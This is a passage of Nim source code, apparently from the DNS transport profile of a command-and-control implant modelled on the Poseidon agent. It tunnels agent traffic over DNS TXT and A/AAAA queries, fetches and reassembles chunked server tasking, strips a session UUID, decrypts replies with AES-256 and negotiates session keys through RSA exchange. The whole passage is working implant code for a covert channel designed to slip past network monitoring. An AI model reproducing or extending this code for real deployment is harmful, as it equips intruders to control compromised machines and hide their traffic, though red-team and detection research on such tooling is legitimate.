        responseBytes[^1]
      debug "[DEBUG] Action code: ", action
      
      # Action codes: 0=AgentToServer, 1=ServerToAgent, 2=ReTransmit, 3=MessageLost
      if action == 2:
        debug "[DEBUG] Server requested retransmit"
        inc retryCount
        continue  # Retry the loop
      elif action == 3:
        debug "[DEBUG] Server lost message"
        return ""
      elif action == 1:
        # ServerToAgent - server has a response ready, we need to fetch it!
        # Fetch ALL chunks from server (like Poseidon's getDNSMessageFromServer)
        debug "[DEBUG] Server has response ready (action=1), fetching all chunks with messageID=", currentMessageID
        
        var receivedChunks: seq[seq[byte]] = @[]
        var totalChunks: uint32 = 0
        var lastChunk: uint32 = 0
        
        # Loop to fetch all response chunks
        while true:
          # Build request packet to fetch the next chunk
          var fetchPacket = DnsPacket(
            action: ServerToAgent,
            agentSessionID: profile.agentSessionID,
            messageID: currentMessageID,
            totalChunks: 0,
            currentChunk: lastChunk,
            data: @[]
          )
          
          let fetchProto = marshalDnsPacket(fetchPacket)
          let fetchEncoded = encodeToDns(cast[string](fetchProto))
          
          debug "[DEBUG] Fetching chunk ", lastChunk, " from server (protobuf=", fetchProto.len, " bytes)"
          let fetchResponse = profile.dnsQuery(fetchEncoded)
          
          if fetchResponse.len == 0:
            debug "[DEBUG] Failed to fetch chunk ", lastChunk, " from server"
            break
          
          # Parse the fetched response
          let fetchBytes = cast[seq[byte]](fetchResponse)
          debug "[DEBUG] Fetched chunk ", lastChunk, ": ", fetchBytes.len, " bytes"
          
          # Unmarshal as protobuf
          try:
            # For TXT records, data is base64-encoded and needs decoding
            let cleanBytes = if profile.recordType == DnsRecordType.TXT:
              debug "[DEBUG] Attempting to decode ", fetchBytes.len, " bytes of base64"
              # Debug: show first/last few bytes to check for issues
              if fetchBytes.len > 0:
                debug "[DEBUG] First 20 bytes hex: ", fetchBytes[0..<min(20, fetchBytes.len)].mapIt(it.toHex(2)).join(" ")
                debug "[DEBUG] Last 20 bytes hex: ", fetchBytes[max(0, fetchBytes.len-20)..<fetchBytes.len].mapIt(it.toHex(2)).join(" ")
                debug "[DEBUG] First 50 chars: ", cast[string](fetchBytes)[0..<min(50, fetchBytes.len)]
                debug "[DEBUG] Last 50 chars: ", cast[string](fetchBytes)[max(0, fetchBytes.len-50)..<fetchBytes.len]
              
              # For fetch responses, TXT data has format: <action_code><base64_data><action_code>
              # Strip action codes from BOTH ends if present
              # Check if first/last characters are '0', '1', '2', or '3' (ASCII 48-51)
              var base64Data = cast[string](fetchBytes)
              
              # Strip leading action code
              if base64Data.len > 0 and ord(base64Data[0]) >= 48 and ord(base64Data[0]) <= 51:
                debug "[DEBUG] First char is action code ('", base64Data[0], "'), stripping it"
                base64Data = base64Data[1..^1]
              
              # Strip trailing action code
              if base64Data.len > 0 and ord(base64Data[^1]) >= 48 and ord(base64Data[^1]) <= 51:
                debug "[DEBUG] Last char is action code ('", base64Data[^1], "'), stripping it"
                base64Data = base64Data[0..^2]
              
              try:
                # Clean base64 string - remove any whitespace/newlines
                base64Data = base64Data.strip()
                if base64Data.len == 0:
                  debug "[DEBUG] Empty base64 string after stripping action code"
                  fetchBytes  # Use original bytes
                else:
                  let decoded = decode(base64Data)
                  debug "[DEBUG] Base64 decode successful: ", decoded.len, " bytes"
                  cast[seq[byte]](decoded)
              except:
                debug "[DEBUG] Base64 decode failed: ", getCurrentExceptionMsg()
                debug "[DEBUG] Full base64 string length: ", base64Data.len
                # Try without padding
                var base64NoPad = base64Data.replace("=", "")
                try:
                  let decoded = decode(base64NoPad & "==")  # Add back minimal padding
                  debug "[DEBUG] Base64 decode with adjusted padding successful"
                  cast[seq[byte]](decoded)
                except:
                  debug "[DEBUG] Adjusted padding also failed, trying as raw bytes"
                  fetchBytes
            else:
              removeTrailingBytes(fetchBytes)
            
            debug "[DEBUG] cleanBytes length: ", cleanBytes.len
            debug "[DEBUG] cleanBytes hex (first 60): ", cleanBytes[0..<min(60, cleanBytes.len)].mapIt(it.toHex(2)).join(" ")
            
            let packet = unmarshalDnsPacket(cleanBytes)
            
            debug "[DEBUG] Unmarshaled packet: action=", packet.action, ", sessionID=", packet.agentSessionID, ", msgID=", packet.messageID, ", total=", packet.totalChunks, ", current=", packet.currentChunk, ", dataLen=", packet.data.len
            
            # Validate packet before processing
            if packet.totalChunks > 10000:
              debug "[DEBUG] Invalid totalChunks (", packet.totalChunks, "), protobuf corrupted or wrong format"
              break
            
            if packet.action != ServerToAgent:
              debug "[DEBUG] Unexpected action (", packet.action, "), expected ServerToAgent (1)"
              break
            
            # Store this chunk's data
            if packet.data.len > 0:
              if totalChunks == 0:
                totalChunks = packet.totalChunks
                if totalChunks == 0:
                  debug "[DEBUG] totalChunks is 0, invalid packet"
                  break
                receivedChunks = newSeq[seq[byte]](int(totalChunks))
                debug "[DEBUG] Initialized receivedChunks array with ", totalChunks, " slots"
              
              if packet.currentChunk < totalChunks:
                receivedChunks[packet.currentChunk] = packet.data
                debug "[DEBUG] Stored chunk ", packet.currentChunk, "/", totalChunks, " (", packet.data.len, " bytes)"
              else:
                debug "[DEBUG] Chunk index ", packet.currentChunk, " >= totalChunks ", totalChunks, ", skipping"
            else:
              debug "[DEBUG] Packet has no data, skipping"
            
            lastChunk += 1
            debug "[DEBUG] Incremented lastChunk to ", lastChunk, ", totalChunks=", totalChunks
            if lastChunk >= totalChunks and totalChunks > 0:
              debug "[DEBUG] Received all ", totalChunks, " chunks"
              break
          
          except:
            debug "[DEBUG] Failed to unmarshal chunk ", lastChunk, ": ", getCurrentExceptionMsg()
            break
        
        # Assemble all chunks
        if receivedChunks.len == 0:
          debug "[DEBUG] No chunks received"
          profile.nextMessageID = responseMessageID + 1
          return ""
        
        var fullResponse: seq[byte] = @[]
        for chunkData in receivedChunks:
          fullResponse.add(chunkData)
        
        var responseData = cast[string](fullResponse)
        debug "[DEBUG] Assembled response: ", responseData.len, " bytes"
        
        # Strip UUID (first 36 bytes)
        if responseData.len <= 36:
          debug "[DEBUG] Response too short, no data after UUID"
          profile.nextMessageID = responseMessageID + 1
          return ""
        
        let responseUuid = responseData[0..<36]
        let encryptedData = responseData[36..^1]
        
        debug "[DEBUG] Response UUID: ", responseUuid
        debug "[DEBUG] Encrypted data length: ", encryptedData.len, " bytes"
        
        # Decrypt if needed (DNS sends raw bytes in protobuf, not base64 like HTTP)
        if profile.aesKey.len > 0 and callbackUuid.len > 0:
          debug "[DEBUG] Decrypting response with AES-256-CBC+HMAC"
          let encryptedBytes = cast[seq[byte]](encryptedData)
          let decryptedBytes = decryptAES256(encryptedBytes, profile.aesKey)
          result = cast[string](decryptedBytes)
        else:
          debug "[DEBUG] No encryption, using response as-is"
          result = encryptedData
        
        debug "[DEBUG] === RECEIVED RESPONSE (FETCHED) ==="
        debug "[DEBUG] Response length: ", result.len, " bytes"
        # Success - increment message counter
        profile.nextMessageID = responseMessageID + 1
        return result
      else:
        # Action code 0 or unknown - no response data
        debug "[DEBUG] Action-only response, no data"
        return ""
    
    # For larger responses, try to unmarshal as complete protobuf packet
    try:
      # For A/AAAA records, remove trailing null padding before unmarshaling
      # For TXT records, data is base64-encoded and needs decoding first!
      let cleanBytes = if profile.recordType == DnsRecordType.TXT:
        # TXT data is base64-encoded protobuf
        let decoded = decode(cast[string](responseBytes))
        cast[seq[byte]](decoded)
      else:
        removeTrailingBytes(responseBytes)
      
      let packet = unmarshalDnsPacket(cleanBytes)
      var responseData = cast[string](packet.data)
      
      # Strip UUID (first 36 bytes)  
      if responseData.len <= 36:
        debug "[DEBUG] Response too short, no data after UUID"
        profile.nextMessageID = responseMessageID + 1
        return ""
      
      let responseUuid = responseData[0..<36]
      let encryptedData = responseData[36..^1]
      
      # Decrypt if needed (DNS sends raw bytes, not base64)
      if profile.aesKey.len > 0 and callbackUuid.len > 0:
        debug "[DEBUG] Decrypting response with AES-256-CBC+HMAC"
        let encryptedBytes = cast[seq[byte]](encryptedData)
        let decryptedBytes = decryptAES256(encryptedBytes, profile.aesKey)
        result = cast[string](decryptedBytes)
      else:
        debug "[DEBUG] No encryption, using response as-is"
        result = encryptedData
      
      debug "[DEBUG] === RECEIVED RESPONSE ==="
      debug "[DEBUG] Response length: ", result.len, " bytes"
      # Success - increment message counter for next message
      profile.nextMessageID = responseMessageID + 1
      return result
    except:
      debug "[DEBUG] Failed to unmarshal response: ", getCurrentExceptionMsg()
      return ""
  
  # If we exhausted retries, still increment message counter
  debug "[DEBUG] Exhausted retry attempts"
  profile.nextMessageID = responseMessageID + 1
  return ""

proc setAesKey*(profile: var DnsProfile, key: seq[byte]) =
  ## Set the AES encryption key (for outbound)
  profile.aesKey = key

proc setAesDecKey*(profile: var DnsProfile, key: seq[byte]) =
  ## Set the AES decryption key (for inbound)
  profile.aesDecKey = key

proc hasAesKey*(profile: DnsProfile): bool =
  ## Check if AES key is set
  result = profile.aesKey.len > 0

proc performKeyExchange*(profile: var DnsProfile): tuple[success: bool, newUuid: string] =
  ## Perform RSA key exchange to establish AES session key
  
  # If no encrypted exchange needed, just use the static PSK
  if not profile.config.encryptedExchange:
    debug "[DEBUG] No key exchange required (ENCRYPTED_EXCHANGE_CHECK=F)"
    return (true, "")
  
  # Only compile RSA code if encrypted exchange is enabled at build time
  when not encryptedExchange:
    debug "[DEBUG] RSA not compiled in (ENCRYPTED_EXCHANGE_CHECK not set at build time)"
    return (true, "")
  
  # Use shared key exchange implementation
  when encryptedExchange:
    # Create a send wrapper that matches the expected signature
    var p = profile  # Create capturable local reference
    proc sendWrapper(data: string, uuid: string): string =
      return p.send(data, uuid)
    
    let result = performRsaKeyExchange(profile.config, profile.config.uuid, sendWrapper)
    
    if result.success and result.sessionKey.len > 0:
      # Set the AES key
      profile.setAesKey(result.sessionKey)
      return (true, result.newUuid)
    elif result.success:
      # No key exchange needed (AESPSK mode)
      return (true, "")
    else:
      debug "[DEBUG] Key exchange failed: ", result.error
      return (false, "")
